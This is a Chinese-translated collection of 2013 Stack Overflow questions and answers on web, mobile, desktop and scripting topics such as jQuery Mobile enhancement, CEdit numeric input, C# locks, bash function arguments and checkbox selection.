必须在初始化 jquery Mobile 之前初始化**[mobileinit 。](http://jquerymobile.com/demos/1.0b2/docs/api/globalconfig.html)**

# 例子：

工作示例：http: [//jsfiddle.net/Gajotres/UZwpj/](http://jsfiddle.net/Gajotres/UZwpj/)

### HTML：

```
<!DOCTYPE html>
<html>
    <head>
        <title>jQM Complex Demo</title>
        <meta name="viewport" content="width=device-width"/>
        <link rel="stylesheet" href="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.css" />
        <script src="http://www.dragan-gaic.info/js/jquery-1.8.2.min.js"></script>           
        <script>
            $(document).on('mobileinit', function () {
            $.mobile.ignoreContentEnabled = true;
            });
        </script>
        <script src="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.js"></script>    
    </head>
    <body>
        <div data-role="page" id="index">
            <div data-theme="a" data-role="header" data-enhance="false">
                <h3>
                    First Page
                </h3>
                <a href="#second" class="ui-btn-right">Next</a>
            </div>

            <div data-role="content">
                <a href="#" data-role="button" id="test-button">Test button</a>
                <!-- Every content inside this div will not be enhanced -->
                <div data-enhance="false">
                    <a href="#" data-role="button" id="test-button">Test button</a>                
                    <div>
                        <a href="#" data-role="button" id="test-button">Test button</a>                
                    </div>                
                </div>
                <a href="#" data-role="button" id="test-button">Test button</a>
            </div>

            <div data-theme="a" data-role="footer" data-position="fixed" data-enhance="false">
                <h3>
                    Footer
                </h3>
            </div>
        </div>   
    </body>
</html> 
```

# 编辑：

动态添加内容的唯一可能解决方案是 data-role="none" 属性，因为 data-enhance="false" 仅适用于从文件加载的内容。

示例：http: [//jsfiddle.net/Gajotres/eUH56/](http://jsfiddle.net/Gajotres/eUH56/)

# javascript - 我有一个 html 容器，它具有绝对定位，但我想让它相对于包装 div 的位置

> ID：15879557
> 
> 赞同：1
> 
> 时间：2013-04-08T12:52:23.717
> 
> 标签：javascript, jquery, css

我有一个内容的 jsfiddle：http: [//jsfiddle.net/fallenreaper/jv7Zr/](http://jsfiddle.net/fallenreaper/jv7Zr/)

问题是我可以执行以下操作：

```
$("*").each(function(){
    if( $(this).css("position") == 'absolute'){
        $(this).css("position","");
    }
});
$("div.container").css("position", "absolute"); 
```

一切都会按原样呈现......但这并不意味着我可以包装内容并移动它。

我的目标是复制该内容块并以可重复的方式将其放入表格中，但绝对定位不允许这样做。

如果我将最后一行替换为：

```
$("div.container").css("position","relative"); 
```

看起来都歪了。。

我错过了什么吗？我在想一切都应该正常工作。

# c++ - 是否可以在 CEdit 控件的纯数字和字母数字输入模式之间切换？

> ID：15879559
> 
> 赞同：1
> 
> 时间：2013-04-08T12:52:30.743
> 
> 标签：c++, windows, input, mfc, cedit

我有一些单选按钮来决定要给予`CEdit`控件的输入类型。按照设计，我的 CEdit 控件接受数字和字符。

有没有办法*仅*在用户单击提供的单选按钮时将此输入限制为仅数字？此外，当用户点击其他选项（即字母数字模式）时，是否可以切换回来？

我使用 Visual C++ 的 GUI 将我的`CEdit`控件设置为接受字母数字字符（即右键单击控件 -> 属性 -> “样式”选项卡 -> 选择“数字”）。

**一个示例用例：**

1.  用户启动应用程序。
2.  用户单击某个按钮，此对话框与所`CEdit`考虑的控件一起显示。
3.  用户会看到单选按钮，其中默认选择字母数字按钮（因为这是在设计时设置的默认模式）。
4.  用户点击数字。

此时，我想将`CEdit`控件的输入限制为仅数字。同样，在此之后，如果用户再次单击字母数字单选按钮，我想删除该限制。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-08T12:56:21.973

是的，用于`CEdit::ModifyStyle()`设置或清除 ES_NUMBER 样式。

所以，让它只接受数字：

```
CEdit *pEdit = // get your control here ...
pEdit->ModifyStyle(0, ES_NUMBER); 
```

并恢复接受所有字符：

```
pEdit->ModifyStyle(ES_NUMBER, 0); 
```

# android - 与意图相关的后期运行时绑定

> ID：15879560
> 
> 赞同：1
> 
> 时间：2013-04-08T12:52:39.240
> 
> 标签：android, android-intent

我尝试通过开发者论坛了解意图。我对此并没有太多了解。尤其是这几行。

“Android 中的活动是通过称为意图的消息激活的。意图消息传递是一种用于在相同或不同应用程序中的组件之间进行后期运行时绑定的工具。Intent 本身，一个 Intent 对象，是一个被动的数据结构，包含对要执行的操作的抽象描述。”</p>

我对此有几个问题。

> (a) 为什么意图消息传递工具被视为组件之间的后期运行时绑定？
> 
> (b) 为什么意图数据结构使用“被动”一词？
> 
> (c) 谁能给我举个例子，这个对要执行的操作的抽象描述是什么意思？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T13:00:41.463

> 为什么意图消息传递工具被视为组件之间的后期运行时绑定？

因为它不是组件之间的编译时绑定（例如，使用 Java 构造函数）。

> 为什么意图数据结构使用“被动”一词？

因为`Intents`是消息，它们本身*不*工作，而是指示其他事情要做的工作。

> 谁能给我一个例子，这个对要执行的操作的抽象描述意味着什么？

```
startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://commonsware.com"))); 
```

在这里，`Intent`是一个抽象描述：我们想要“查看”由以 开头的 URI 标识的东西`http://`。在 Android 上，任何数量的活动都可以对此做出响应`Intent`，包括 Web 浏览器和专门的应用程序，由秃顶的家伙支持他们的网站。根据设备，零个、一个或多个活动可以匹配此`Intent`结构，Android 可以处理所有这些场景。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:00:50.813

> (a) 为什么意图消息传递工具被视为组件之间的后期运行时绑定？

我认为这是因为，虽然您可以`intent filters`在.`manifest``Activities``Activities`

> (b) 为什么意图数据结构使用“被动”一词？

An`Intent`实际上并不是一个动作，而是正如它所说的，一条消息告诉组件该做什么并为其提供数据。

> 谁能给我一个例子，这个对要执行的操作的抽象描述意味着什么？

在其最简单和最常见的形式中，an`Intent`像这样用于开始一个`Activity`

```
Intent intent = new Intent(MainActivity.this, NextActivity.class);
intent. putExtra("key", value);  // used to send data such as a variable value. "key" is used in NextActivity to retrieve the data, value is the actual variable that you want to send
startActivity(intent);  //starts the NextActivity 
```

我希望这回答了你的问题。

# c# - Monitor.Enter调用.Net中对象参数的作用

> ID：15879561
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:52:41.253
> 
> 标签：c#, multithreading

我们都知道下面的代码是用来形成临界区的。

```
 public class CommonResource
{
    public object obj = new object();

    public void PopularFunction()
    {
        lock (obj)
        {
            ///Access variable that we want to protect form being accessed concurrently 
            ///This forms critical section
            ///My question is what is role'obj' plays in forming critical section.
            ///How it works behind the scene.
        }

        ///Above code can be written as 

        Monitor.Enter(obj);
        ///Access variable that we want to protect form being accessed concurrently 
        ///This forms critical section
        ///My question is what is role'obj' plays in forming critical section.
        ///How it works behind the scene.
        Monitor.Exit(obj);
    }
} 
```

我的问题是 Monitor.Enter 如何在“obj”的帮助下形成一个关键部分。如果我们需要始终传递一个对象，为什么框架不能显式传递任何对象。这背后肯定有什么原因。谁能解释一下？

谢谢，赫曼特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:57:20.240

您正在传递一个对象以用作锁的标识符。考虑我有以下课程：

```
public class LockTest
{
    private object obj1 = new object();
    private object obj2 = new object();

    public void Method1()
    {
        lock(obj1)
        {
            ...
        }
    }

    public void Method2()
    {
        lock(obj2)
        {
            ...
        }
    }

    public void Method3()
    {
        lock(obj1)
        {
            ...
        }
    }
} 
```

如果我要从不同的线程调用`Method1`和调用`Method2`，则两个调用都不会阻塞另一个调用，因为它们锁定了不同的对象。但是，如果我要从不同的线程调用`Method1`和，则执行的第一个线程将阻塞另一个线程的执行，直到在块结束时释放锁。`Method3``lock(obj1)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:00:29.063

使用它是为了让框架知道`scope`锁的类型。

基本上，您想使用静态对象或非静态对象。

```
public class Foo
{
    private object sync = new object();
    public void Bar()
    {
        lock (this.sync)
        {
            // You can call new Foo().Bar() multiple times, because
            // each Foo class lock its own instance of the sync object
        }
    }
}

public class Foo
{
    private static object sync = new object();
    public void Bar()
    {
        lock (sync)
        {
            // You can't call new Foo().Bar() multiple times, because
            // each Foo class lock the same instance of the sync object
        }
    }
} 
```

# java - String.nextLine() Java - 崩溃

> ID：15879563
> 
> 赞同：0
> 
> 时间：2013-04-08T12:52:44.660
> 
> 标签：java, string, exception, nosuchelementexception

我仍然对 String parts = input.nextLine(); 这一行有疑问。它不断崩溃，如果我删除“Line”，那很好，但我想读取包括空格在内的整个字符串并存储它。假设我之前已经声明了所有变量和数组。

```
System.out.print("Enter registration number of vehicle: ");
String inputREGO = input.nextLine();
System.out.print(inputREGO);
boolean flag = false;
for(int i=0; i<6; i++){
    if(inputREGO.equalsIgnoreCase(services[i].getregoNUMBER())){
        System.out.print("Enter Part Description: ");

        String parts = input.next();
        System.out.print("Enter Part Cost: ");

        Double cost = input.nextDouble();
        services[i].addPARTDETAILS(parts, cost);
        flag = true;
    }
}

if(!flag)
    System.out.println("No registration number were found in the system.");

public boolean addPARTDETAILS(String partDESCRIPTION, double partCOST){
    if(partDESCRIPTION.isEmpty() || partCOST <= 0){
        System.out.println("Invalid input, please try again!");
        return false;
    }
    else{
        StringBuffer strBuf = new StringBuffer();
        strBuf.append("    ").append(partDESCRIPTION).append(" ($").append(partCOST).append(")");
        partLIST += strBuf;
        System.out.printf("\n%10s", partLIST);
        System.out.println("\n Parts recorded successfully for vehicle " + getregoNUMBER());
        totalPART+=partCOST;
        return true;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:00:14.303

您可以使用[BufferedReader](http://docs.oracle.com/javase/6/docs/api/java/io/BufferedReader.html)：

```
BufferedReader bufferRead = new BufferedReader(new InputStreamReader(System.in));
String text = bufferRead.readLine(); 
```

或[扫描仪](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Scanner.html)：

```
 Scanner scanIn = new Scanner(System.in);
   String text = scanIn.nextLine(); 
```

两者都应该没有任何问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:03:13.527

看看[nextLine](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html#nextLine%28%29)：

> 抛出：
> 
> NoSuchElementException -**如果没有找到行**
> 
> IllegalStateException -**如果此扫描仪已关闭**

确保在到达导致问题的线路之前*未关闭*扫描仪.. 还要确保..*有一条线路*。

我没有看到任何其他可能导致您的程序*“崩溃”*的问题（如果您更好地定义*“崩溃”*是什么，您将帮助我们帮助您）

# java - MS Access 数据库备份版本控制

> ID：15879573
> 
> 赞同：1
> 
> 时间：2013-04-08T12:53:17.017
> 
> 标签：java, ms-access-2007

我正在使用 MS 访问数据库 .mdb 文件来存储信息（10 个表）。该文件存储在 G Drive 的网络文件夹中，并且每天都会对 G Drive 进行备份（通过公司服务器）。我开发了一个 Java 应用程序（Swing/JFrame），它可以读/写到数据库中。应用程序和数据库现在工作正常。

我在公司做短期实习生，这个应用程序是我自己开发的。如果数据库损坏或崩溃怎么办？我怎样才能做到这一点，如果它今天崩溃然后取前一天的数据/文件并运行？

我问是因为如果我离开公司后数据库损坏了，其他人都不知道该怎么办？

有人可以推荐/建议一个过程来克服上述情况吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:24:03.100

要创建文件的多个备份副本，您可以使用 Windows 中的自动任务将当前 .mdb 文件复制到单独的位置，并使用修改的文件名来指示它何时被复制（备份）。我的服务器使用 VBScript 来执行这样的任务，并且代码使用`Weekday(Now)`包含对应于星期几（1 到 7）的数值作为文件名的一部分。所以我的备份文件夹包含文件...

```
crmBackup1.bak
crmBackup2.bak
...
crmBackup7.bak 
```

...而且我总是可以使用 7 天的备份。

如果您正在寻求一种方法让您的应用程序*自动*检测损坏的数据文件并恢复到前一天的备份，那么这不是一个好主意。根据损坏的性质，当前文件中的数据*可能*是可挽救的，因此自动“将其丢弃”将是不幸的。

# ios - 在运行时替换 ios 应用程序的 url 方案？

> ID：15879575
> 
> 赞同：2
> 
> 时间：2013-04-08T12:53:22.960
> 
> 标签：ios

我可以在运行时替换我的 ios url 方案吗？或者我们可以以编程方式替换 Info.plist 文件吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-09T19:38:27.140

我在这里看到了这个问题的答案：[link](http://img.pandawhale.com/39215-grumpy-cat-no-Vyfj.jpeg)

# iphone - 角色移动时iOS FPS低帧率，分析器显示Physics.Simulate需要cpu时间

> ID：15879576
> 
> 赞同：0
> 
> 时间：2013-04-08T12:53:26.867
> 
> 标签：iphone, ios, performance, unity3d, physics

我们为 iOS 开发 FPS 游戏。玩家角色是来自标准资产（移动）的第一人称控制。它附有标准的角色控制器。

我们的场景中有 7 个敌人每个敌人都有一个非运动刚体。当玩家靠近时，敌人会移动到玩家身边

场景有 5500 个三角形 / 6000 个顶点 当玩家不动时，我们在 iPhone 4 上有 20-25 fps。当玩家开始移动时，fps 下降到 7-10。

此外，我们通过直接改变他们的变换来移动敌人，而不是通过调用 AddForce。

在分析器中，我们可以看到当玩家移动时，Physics.Simulate 会占用大约 60%-70% 的 cpu。

我们应该如何解决这个问题？

我们是 Unity 和 3D 的新手。对不起我的英语不好。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T14:28:02.830

根据 Unity 的文档，在 iOS 设备中使用物理引擎会降低性能，因为它严重依赖浮点数运算。[http://docs.unity3d.com/Documentation/Manual/iphone-basic.html](http://docs.unity3d.com/Documentation/Manual/iphone-basic.html)

为了提高性能，如文档建议的那样，避免使用 Mesh Colliders，设置低固定帧速率，并启用刚体插值。

> **我可以制作使用重物理的游戏吗？** 答：iOS 上的物理可能很昂贵，因为它需要大量的浮点数运算。如果可能，您应该完全避免使用 MeshColliders，但如果确实需要，可以使用它们。要提高性能，请通过 Edit->Time->Fixed Delta Time 使用较低的固定帧速率。建议使用 10-30 的帧率。启用刚体插值以在使用低物理帧速率时实现平滑运动。为了在没有振荡的情况下实现完全流畅的帧速率，最好根据您的游戏在 iOS 上获得的平均帧速率选择固定的 deltaTime 值。建议使用 1:1 或一半的帧速率。例如，如果您获得 30 fps，您应该使用 15 或 30 fps 来获得固定帧速率（0.033 或 0.066）

# javascript - php中的JavaScript HTML5

> ID：15879580
> 
> 赞同：-1
> 
> 时间：2013-04-08T12:53:29.450
> 
> 标签：javascript, php, html, canvas, shapes

我用html5做了一个形状，它看起来像一个冲浪板。代码：

```
 <script>
var c=document.getElementById("myCanvas");
var ctx=c.getContext("2d");
ctx.beginPath();
ctx.moveTo(100, 5);
ctx.bezierCurveTo(50,5,-50,300,50,505);
ctx.lineTo(150,505);
ctx.bezierCurveTo(250,300,150,0,100,5);

img = new Image()
img.addEventListener('load', function(e) {
    ctx.fillStyle = ctx.createPattern(this, "repeat");
        ctx.fill();
    }, true);

ctx.lineWidth = 5;  
ctx.stroke();
ctx.closePath();

img.src= "<?php echo $uploadfile ?>" 

    </script> 
```

现在我的问题是，我的数据库中存储了多个图像（只有图像路径）。

现在我想显示我存储在数据库中的所有图像以这种形状显示。所以我的形状是一块冲浪板，现在我想要多个冲浪板并排。

```
<?php
    dbConn();

    $q_select_images = mysql_query("select * from orders");

    while($row = mysql_fetch_array($q_select_images))
    {
         print "<img src=\"/test/". $row['image'] . "\" />";

    }

    closeDbConn();
    ?> 
```

上面的代码是显示我存储在数据库中的所有图像。我如何组合这两个脚本。

因为仅仅将 JavaScript 代码放在 while{ } 函数中是行不通的。我想在每次另一个图像时重复该形状。

请帮助我，我无法弄清楚。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:58:46.040

您可以先获取所有图像路径并将它们放入 JavaScript 数组中：

```
$images = array();
while ($row = mysql_fetch_array($q_select_images)) {
     $images[] = $row['image'];
} 
```

然后添加这个 JavaScript 代码：

```
?>
<script type="text/javascript">
var images = <?php echo json_encode($images); ?>,
body = document.getElementsByTagName('body')[0];

for (var i = 0, n = images.length; i < n; ++i) {
    myImageFn(body, images[i]);
}

function myImageFn(container, path)
{
    var c = document.createElement('canvas');
    c.style.width = '200px';
    c.style.height = '510px';

    var ctx=c.getContext("2d");
    ctx.beginPath();
    ctx.moveTo(100, 5);
    ctx.bezierCurveTo(50,5,-50,300,50,505);
    ctx.lineTo(150,505);
    ctx.bezierCurveTo(250,300,150,0,100,5);

    img = new Image()
    img.addEventListener('load', function(e) {
        ctx.fillStyle = ctx.createPattern(this, "repeat");
            ctx.fill();
        }, true);

    ctx.lineWidth = 5;  
    ctx.stroke();
    ctx.closePath();

    img.src = path;

    container.appendChild(c);
} 
```

但是，对于每个图像，您仍然必须将它们添加到 DOM。

# javascript - 如何在 jQuery 中实现“rollout”效果

> ID：15879583
> 
> 赞同：0
> 
> 时间：2013-04-08T12:53:45.457
> 
> 标签：javascript, jquery, css

看看这个人的博客：

[http://simplebits.com](http://simplebits.com)

当您将鼠标悬停在帖子左侧的“无限”符号上时，我真的很喜欢动画效果 - 它会为帖子推出一个缩短的 URL。我正在尝试弄清楚如何适应/模仿这一点（我希望将电子邮件符号作为图像并在其悬停时推出我的电子邮件地址）。

我对 jQuery 比较陌生（我假设这个效果已经完成）。知道我该怎么做吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:05:36.400

这是一个简单的例子：

[jsFiddle 链接](http://jsfiddle.net/zT9Y8/7/)

我在默认情况下应用了 0 宽度，在悬停时`width: auto`或在我的情况下为 300 像素：p 不透明度，只需将默认样式添加到低值并将悬停状态设置为最大或更高：p 反之亦然。

```
-webkit-transition: all .5s ease .05s;
-moz-transition: all .5s ease .05s;
-o-transition: all .5s ease .05s;
-ms-transition: all .5s ease .05s;
transition: all .5s ease .05s 
```

玩得开心。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:21:40.907

就像@AshentePaul 说你可以用 CSS3 来做......但如果你真的想用 jQuery 来做，看看[jQuery.fn.animate](http://api.jquery.com/animate/)函数......

[演示](http://jsfiddle.net/fernandosavio/u8MS3/)

```
var $col = $("#collapse"),
    $example = $("#example");

$example.hover(
    function(){
        $example.stop().animate({opacity: 1}, 400, "linear");
        $col.stop().animate({ width: "200px" }, 400, "linear");
    },
    function(){
        $example.stop().animate({ opacity: 0.3 }, 400, "linear");        
        $col.stop().animate({ width: "0" }, 400, "linear");
    }
); 
```

# ios - 如何在电子邮件 IOS 中设置收件人

> ID：15879588
> 
> 赞同：-4
> 
> 时间：2013-04-08T12:53:52.827
> 
> 标签：ios, email

这就是我点击时用来邮寄的东西

```
- (IBAction)email:(id)sender {
    if ([MFMailComposeViewController canSendMail]) {

        MFMailComposeViewController *mailViewController = [[MFMailComposeViewController alloc] init];
        mailViewController.mailComposeDelegate = self;
        [mailViewController setSubject:@"Subject Goes Here."];

         [mailViewController setMessageBody:@"Your message goes here." isHTML:NO];

          [self presentModalViewController:mailViewController animated:YES];
          [mailViewController release];

          }

          else {

              NSLog(@"Device is unable to send email in its current state.");

          } 
```

现在当我点击它时有一个邮件按钮然后该视图出现用于撰写邮件所以在按钮旁边有一个名为_emailTextField的文本字段所以我想要的是当点击按钮时该文本字段应该出现在撰写邮件视图中，就像在文本字段中一样有 hell@yahoo.com 然后在 TO 的 mailview 中它应该是 hell@yahoo 作为收件人

请告诉我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:56:39.577

```
 NSArray *recipentsArray = [[NSArray alloc]initWithObjects:@"xxx@gmail.com", nil];
 [mailViewController setToRecipients:recipentsArray]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:56:10.400

您可以使用 ：

```
[mailViewController setToRecipients:[NSArray arrayWithObject: _emailTextField.text,nil]]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:59:26.527

```
mailViewController.recipients = [NSArray arrayWithObjects:@"abc@xyz.com",nil]; 
```

# phpstorm - PHPStorm / Webstorm，如何用关联程序打开文件

> ID：15879589
> 
> 赞同：10
> 
> 时间：2013-04-08T12:53:54.063
> 
> 标签：phpstorm, webstorm

我是 Webstorm/PHPStorm 的新用户。在这个 IDE 之前，我使用的是 Netbeans。要打开 .xds 文件，这是一种文本文件，您可以像打开 .js 文件一样打开它并在编辑器中进行编辑。在 Netbeans 中，您必须选择：**在系统中打开**。现在关联的程序启动并使用所选文件打开它。

在 Webstorm/Phpstorm 中是否有其他方法可以做到这一点？现在我只需右键单击并选择选项：在资源管理器中显示。然后双击文件 .xds。

提前致谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-08T13:21:53.240

使用**在相关应用程序**中打开的文件`File`| `Settings`| `File Types`：

![联系](https://i.stack.imgur.com/6ZU50.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-08T13:28:06.697

AFAIK 在当前版本中没有可用的此类操作。

两种选择：

1.  将此类扩展名/模式分配给**在**. **缺点：**您将无法在 IDE 本身中打开此类文件。`Settings | Editor | File Types`

***   创建自定义**外部工具**条目 ( `Settings | Tools | External Tools`)，它将在您的操作系统中使用默认应用程序启动此类文件。对于 Windows，它可以是：** 

 **`Program: cmd.exe`
`Parameters: /C start "$FilePath$"`**

# python - Arduino Heroku 请求

> ID：15879592
> 
> 赞同：1
> 
> 时间：2013-04-08T12:54:01.290
> 
> 标签：python, http, heroku, arduino, httprequest

我正在尝试从 Arduino 向[Heroku](http://en.wikipedia.org/wiki/Heroku)应用程序发出请求。它返回的只是 Heroku 的 404 页面。所以我用 Python 写了一个类似的脚本，它运行良好。

### Arduino代码：

```
char serverName[] = "ruby-coffee-maker.herokuapp.com";

...

if (!client.connected()) {
    Serial.println("connecting...");

    if (client.connect(serverName, 80)) {
        Serial.println("connected");

        // Make a HTTP request
        client.println("GET / HTTP/1.0");
        client.println();

        // Wait for response
        delay(100);

        // If data can be read from te server, print it
        while (client.available()) {
            char c = client.read();
            Serial.print(c);
        }

        Serial.print("Done");
        client.stop();
    }
    else {
      // If you didn't get a connection to the server:
      Serial.println("connection failed");
    }
} 
```

### Python代码：

```
import httplib

h = httplib.HTTPConnection("ruby-coffee-maker.herokuapp.com")

h.request("GET", "/")

r = h.getresponse()
data = r.read()

print r.status, r.reason, "\"" + data + "\""

h.close() 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:58:23.837

您是否将 Arduino 代码发送的请求与 Python 代码进行了比较？根据我对 HTTP/1.1 的理解，您需要在 GET 请求中添加一个 Host 头文件。[请参阅此处](http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html)的5.1.2 。

抱歉，我刚刚看到你在你的 Arudino 请求中使用了 HTTP/1.0，有什么特别的原因吗？即使 1.0 不需要 Host-filed，您也可能需要包含它（例如，某些代理要求它存在）。

# liferay - Liferay - 在面包屑中显示 portlet 内容（标题）？

> ID：15879593
> 
> 赞同：1
> 
> 时间：2013-04-08T12:54:03.953
> 
> 标签：liferay

我创建了一个自定义 portlet，其中显示了一些内容，例如标题、描述等。所以我希望我的标题显示在面包屑中？我该如何进行呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T08:09:20.417

如果这仍然准确，我还没有尝试过，但你可以试试[Alexey 的](http://www.emforge.net/web/akakunin/blogs/-/blogs/249105)建议使用

```
PortalUtil.addPortletBreadcrumbEntry(request, title, url); 
```

使用 liferay-portlet.xml 的给定配置

```
<private-request-attributes>false</private-request-attributes> 
```

# jquery - 链接相互重叠

> ID：15879597
> 
> 赞同：0
> 
> 时间：2013-04-08T12:54:29.423
> 
> 标签：jquery, html, css, wordpress

当您将鼠标悬停在我网站上的链接（关于、图库和联系人）上时，它们会重叠。当您将鼠标放在“关于”选项卡上时，“图库”选项卡会突出显示，同样，当您将鼠标放在“图库”选项卡上时，“联系人”选项卡会突出显示。同样的问题发生在底部选项卡上。

[http://www.redechoevents.co.uk/](http://www.redechoevents.co.uk/)

```
/*Logo
------------------------------------------------------------ */ 
#logo-image {
    position: absolute;
    left: 100%;
    bottom: 0;
    width: 217px;
    height: 628px;
    z-index: 2;
    overflow: hidden;
}

#about {
    position: absolute;
    left: 0;
    top: 0;
    height: 89px;
    width: 336px;
}

span.title-link {
    font-size: 6.8em;
    font-weight: bold;
    font-family: 'Titillium Web', Arial, sans-serif;
    text-decoration: none;
    line-height: 93px;
    cursor: pointer;
    opacity: 0;
    display: inline-block !important;
}

span.title-link a {
    color: #FFF;
    text-decoration: none;
    display: inline-block !important;
}

.title-link a:hover {
    color: #E91F4C;
    display: inline-block !important;
}

#about-red {
    left: -104px;
    width: 545px;
}

#logo-red {
    height: 93px;
    width: 209px;
    position: absolute;
    left: 336px;
}   

/*Echo
------------------------------------------------------------ */
#gallery {
    position: absolute;
    left: 0;
    top: 0;
    height: 92px;
    width: 434px;
}   

#gallery-echo {
    left: -202px;
    width: 714px;
}

#logo-echo {
    height: 93px;
    width: 280px;
    position: absolute;
    left: 434px;
}   

/*Events
------------------------------------------------------------ */
#contact-events {
    left: -216px;
    width: 862px;
}   

#contact {
    position: absolute;
    left: 0;
    top: 0;
    height: 92px;
    width: 448px;
}   

#logo-events {
    height: 93px;
    width: 414px;
    position: absolute;
    left: 448px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:10:44.063

试试这个

```
.container {
    overflow-y: hidden;
} 
```

并至少调整`width`for和to `#about-red`，这样你就不会得到水平滚动条。`#gallery-echo``#contact-events``900px`

```
#about-red,
#gallery-echo,
#contact-events {
    width: 900px;
} 
```

# windows-phone-7 - 如何在 Windows Phone 上处理大列表

> ID：15879602
> 
> 赞同：0
> 
> 时间：2013-04-08T12:54:35.667
> 
> 标签：windows-phone-7

我有这个 xaml：

```
 <controls:Pivot>
        <controls:PivotItem Header="All Stations">
            <ScrollViewer>
                <ItemsControl x:Name="allStations">
                    <ItemsControl.ItemsPanel>
                        <ItemsPanelTemplate>
                            <VirtualizingStackPanel />
                        </ItemsPanelTemplate>
                    </ItemsControl.ItemsPanel>
                    <ItemsControl.ItemTemplate>
                        <DataTemplate>
                            <Button Content="{Binding Name}"
                                    Click="OnStationClick" />
                        </DataTemplate>
                    </ItemsControl.ItemTemplate>
                </ItemsControl>
            </ScrollViewer>
        </controls:PivotItem>
    </controls:Pivot> 
```

在后面的代码中，我设置`allStations.ItemsSource`了一个包含大约 2500 个项目的集合，这使得 UI 冻结了几秒钟。我能做些什么来加快这个负载？虚拟化应该确保它只需要为 10 个左右的项目创建控件，但它似乎正在为所有项目创建控件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T15:47:05.110

不要绑定到庞大的 2500 个项目集合。将前 50-100 个项目复制到可观察集合并将其绑定到*allStations*。然后简单地[检测用户何时滚动到列表底部](http://blog.slimcode.com/2010/09/11/detect-when-a-listbox-scrolls-to-its-end-wp7/)并将接下来的 50-100 项复制到可观察集合中。

# linux - 将参数解析为函数的目的是什么？

> ID：15879606
> 
> 赞同：0
> 
> 时间：2013-04-08T12:54:52.170
> 
> 标签：linux, bash

如果我做

```
#!/bin/bash

a=2
func() {
    echo $a
    echo $b
}

b=3
func $b 
```

然后它会打印出来`2\n3`，我只会在其中预期`3`。

**问题**

当全局变量在函数内部可用时。那么在 BASH 中将参数解析为函数的目的是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:12:45.403

Bash 不是这样工作的。您没有在函数内部接受任何参数。相反，您只是初始化了稍后在函数中回显的两个全局变量。

为了执行您需要的操作，您应该执行以下操作：

```
#!/bin/bash

a=2
func() {
    # first argument
    echo $1
    # second argument
    echo $2
}

b=3
func $b
func $a $b 
```

输出：

```
3

2
3 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:11:32.993

您将参数传递给函数，以便它们可以处理不同的参数值。

您的代码没有使用传递的参数，而是使用了全局变量。改为考虑：

```
#!/bin/bash

a=2
b=3

func() {
  echo $1
}

func ${a}
func ${b} 
```

产量：

```
2
3 
```

# javascript - Jquery“全选”复选框

> ID：15879608
> 
> 赞同：13
> 
> 时间：2013-04-08T12:54:57.453
> 
> 标签：javascript, jquery, html

一旦单击“全选”复选框，我将尝试选择页面上的所有复选框，并且我正在为此使用 jquery，如您在以下链接中所见：

[http://jsfiddle.net/priyam/K9P8A/](http://jsfiddle.net/priyam/K9P8A/)

选择和取消选择所有复选框的代码是：

```
function selectAll() {
    $('.selectedId').attr('checked', isChecked('selectall'));
}

function isChecked(checkboxId) {
    var id = '#' + checkboxId;
    return $(id).is(":checked");
} 
```

在坚持了一天之后，我仍然不知道为什么我不能让它工作。请帮忙

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-08T13:14:30.213

你为什么不这样做呢？它更清晰易读

```
$('#selectall').click(function () {
    $('.selectedId').prop('checked', this.checked);
});

$('.selectedId').change(function () {
    var check = ($('.selectedId').filter(":checked").length == $('.selectedId').length);
    $('#selectall').prop("checked", check);
}); 
```

[演示](http://jsfiddle.net/K9P8A/13/)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-04-08T12:57:05.837

[在我做了 3 次修复后，你的小提琴就可以工作了](http://jsfiddle.net/5XMW4/)：

*   jQuery 的导入（左上菜单）
*   添加缺少的`isChecked`功能
*   使用[道具](http://api.jquery.com/prop/)而不是`attr`检查框

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-04-08T13:00:25.437

这是因为该方法`selectAll`在全局范围内不可用。

在左侧面板的第二个下拉列表中`Frameworks and Extensions`，选择`no -wrap head/body`它会正常工作。

默认情况下选择的原因`onload`是选择Onload时，所有输入的脚本都包裹在匿名函数中，如下所示。它将使`selectAll`函数成为匿名函数内的本地方法，因此使用全局范围的 onclick 事件处理程序将无法访问导致`Uncaught ReferenceError: selectAll is not defined`错误的方法。

```
$(window).load(function(){
    //Entered script
}); 
```

演示：[小提琴](http://jsfiddle.net/Dsjwn/)

